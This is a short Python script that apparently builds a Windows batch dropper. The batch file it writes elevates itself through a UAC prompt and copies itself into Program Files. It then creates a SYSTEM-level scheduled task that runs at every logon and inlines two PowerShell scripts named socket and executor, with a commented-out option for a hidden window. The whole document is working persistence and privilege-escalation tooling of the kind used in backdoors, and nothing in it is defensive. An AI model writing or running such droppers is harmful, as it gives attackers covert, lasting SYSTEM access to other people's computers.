socketBat = open("socket.bat", "w")

socketBat.write("@echo off \r\n");
socketBat.write("if not \"%1\"==\"am_admin\" (powershell start -verb runas '%0' am_admin & exit /b) \r\n");

socketBat.write("mkdir C:\\\"Program Files\"\\AAA\r\n")
socketBat.write("copy %0 C:\\\"Program Files\"\\AAA\\ \r\n")
socketBat.write("schtasks /create /F /ru \"SYSTEM\" /sc onlogon /tn BatSocket /rl highest /tr \"\\\"C:\\Program Files\\AAA\\socket.bat\"\\\" \r\n")
# /ru \"SYSTEM\"
socketBat.write("start powershell -Command \"");
#-windowstyle hidden
socket = open("socket.ps1", "r")
executor = open("executor.ps1", "r")

while 1: 
    char = socket.read(1)           
    if not char: 
        socketBat.write('"\r\n')
        break
    if char != '\n':      
        socketBat.write(char)

socketBat.write("start powershell -Command \"");
while 1:
    char = executor.read(1)  
    if not char: 
        socketBat.write('"\r\n')
        break 
    if char != '\n':      
        socketBat.write(char)   

socketBat.write("pause \r\n");
socketBat.close()
socket.close()
executor.close()